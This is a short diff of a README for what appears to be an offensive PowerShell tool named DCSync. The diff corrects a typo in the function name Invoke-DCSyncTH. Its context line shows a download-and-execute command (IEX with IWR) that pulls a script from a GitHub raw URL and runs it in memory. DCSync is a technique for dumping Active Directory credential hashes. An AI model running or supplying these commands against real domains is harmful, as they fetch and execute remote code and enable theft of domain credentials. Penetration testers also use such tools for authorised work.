@@ -7,7 +7,7 @@ IEX(IWR -usebasicparsing https://raw.githubusercontent.com/The-Viper-One/DCSync-
 ```
 ### Execute after loading into memory:
 ```
-Invoke-DCSynTH
+Invoke-DCSyncTH
 ```
 
 ![image](https://user-images.githubusercontent.com/68926315/222810926-7b0c6bfd-e93b-42bc-95c4-877bb6b31a81.png)
